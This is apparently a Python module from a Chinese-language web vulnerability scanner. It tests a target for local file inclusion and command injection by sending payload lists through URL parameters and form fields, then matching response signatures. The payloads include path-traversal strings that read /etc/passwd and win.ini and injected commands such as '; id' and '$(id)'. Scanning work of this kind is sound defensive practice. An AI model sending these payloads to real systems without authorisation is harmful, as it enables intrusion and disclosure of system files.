"""
本地文件包含（LFI）/ 命令注入检测
Author: 火柴 | GitHub: huocai250

修复:
- 移除定义但从未使用的 RFI_PAYLOADS（死代码）
- 添加 POST 表单参数测试
- 发现漏洞后提前返回
"""
import re
from utils.http import extract_forms
from core.scanner import BaseScanner
from core.colors import log

LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2Fetc%2Fpasswd",
    "..%252Fetc%252Fpasswd",
    "%2e%2e%2fetc%2fpasswd",
    "%2e%2e%c0%afetc%c0%afpasswd",
    "/etc/passwd",
    "/proc/self/environ",
    # Windows
    "..\\windows\\win.ini",
    "..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini",
    "%2e%2e%5cwindows%5cwin.ini",
]

LFI_PARAMS = [
    "file", "page", "include", "path", "doc", "document",
    "folder", "root", "pg", "style", "template", "php_path",
    "load", "read", "lang", "locale", "module", "view",
]

LFI_SIGS = [
    r"root:.*:0:0:", r"\[boot loader\]", r"\[fonts\]",
    r"daemon:.*:/usr", r"/bin/bash", r"/bin/sh",
    r"WINDIR", r"\[drivers\]", r"HTTP_HOST", r"DOCUMENT_ROOT",
]

CMD_PAYLOADS = [
    "; id",        "| id",       "& id",
    "; whoami",    "| whoami",   "& whoami",
    "; id #",      "' ; id #",   "\" ; id #",
    "`id`",        "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
]

CMD_PARAMS = [
    "cmd", "exec", "command", "execute", "ping", "query",
    "jump", "code", "reg", "do", "func", "exp", "text", "input",
    "host", "ip", "addr",
]

CMD_SIGS = [
    r"uid=\d+\(", r"gid=\d+\(", r"groups=\d+",
    r"root:", r"daemon:", r"PING.*bytes of data",
    r"total \d+", r"drwxr",
]


class LFIScanner(BaseScanner):
    def run(self):
        log("INFO", "LFI & 命令注入检测...")
        r = self.get(self.target)
        # GET 参数测试
        if not self._test_lfi_get():
            if r:
                self._test_lfi_forms(r.text)
        if not self._test_cmd_get():
            if r:
                self._test_cmd_forms(r.text)

    # ── LFI ─────────────────────────────────────────────────

    def _test_lfi_get(self) -> bool:
        for param in LFI_PARAMS:
            for payload in LFI_PAYLOADS:
                r = self.get(self.target, params={param: payload})
                if r and self._has_lfi(r.text):
                    log("VULN", f"[LFI] GET 参数: {param} | {payload[:30]}")
                    self.result.add("文件包含", "CRITICAL",
                                    f"[LFI] 参数 '{param}' 存在本地文件包含",
                                    f"Payload: {payload}", url=self.target)
                    return True
        return False

    def _test_lfi_forms(self, html: str):
        for form in extract_forms(html):
            action = form["action"] or self.target
            if not action.startswith("http"):
                action = self.url(action)
            for param in form["inputs"]:
                for payload in LFI_PAYLOADS[:6]:   # 表单只测前6个，避免过慢
                    data = form["inputs"].copy()
                    data[param] = payload
                    r = self._req(form["method"], action, data)
                    if r and self._has_lfi(r.text):
                        log("VULN", f"[LFI] 表单参数: {param} | {payload[:30]}")
                        self.result.add("文件包含", "CRITICAL",
                                        f"[LFI] 表单参数 '{param}' 存在本地文件包含",
                                        f"Payload: {payload}", url=action)
                        return

    # ── 命令注入 ─────────────────────────────────────────────

    def _test_cmd_get(self) -> bool:
        for param in CMD_PARAMS:
            for payload in CMD_PAYLOADS:
                r = self.get(self.target, params={param: payload})
                if r and self._has_cmd(r.text):
                    log("VULN", f"[命令注入] 参数: {param} | {payload}")
                    self.result.add("命令注入", "CRITICAL",
                                    f"[RCE] 参数 '{param}' 存在命令注入",
                                    f"Payload: {payload}", url=self.target)
                    return True
        return False

    def _test_cmd_forms(self, html: str):
        for form in extract_forms(html):
            action = form["action"] or self.target
            if not action.startswith("http"):
                action = self.url(action)
            for param in form["inputs"]:
                for payload in CMD_PAYLOADS[:4]:
                    data = form["inputs"].copy()
                    data[param] = payload
                    r = self._req(form["method"], action, data)
                    if r and self._has_cmd(r.text):
                        log("VULN", f"[命令注入] 表单参数: {param}")
                        self.result.add("命令注入", "CRITICAL",
                                        f"[RCE] 表单参数 '{param}' 存在命令注入",
                                        url=action)
                        return

    # ── 辅助 ─────────────────────────────────────────────────

    def _req(self, method, url, params):
        return self.post(url, data=params) if method == "POST" else self.get(url, params=params)

    def _has_lfi(self, text: str) -> bool:
        return any(re.search(p, text) for p in LFI_SIGS)

    def _has_cmd(self, text: str) -> bool:
        return any(re.search(p, text) for p in CMD_SIGS)
